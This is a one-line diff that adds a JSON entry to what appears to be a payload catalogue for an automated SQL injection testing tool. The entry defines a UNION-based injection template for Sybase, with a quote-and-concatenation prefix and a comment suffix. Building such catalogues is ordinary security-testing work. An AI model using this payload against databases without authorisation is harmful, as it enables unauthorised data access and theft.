@@ -1,0 +1,1 @@
+{"dbms": "sybase", "technique": "union", "boundary": {"prefix": "'||", "suffix": "-- -", "type": "concat"}, "vector": "{B} UNION ALL SELECT NULL,NULL", "comment": "sybase union: single+concat"}
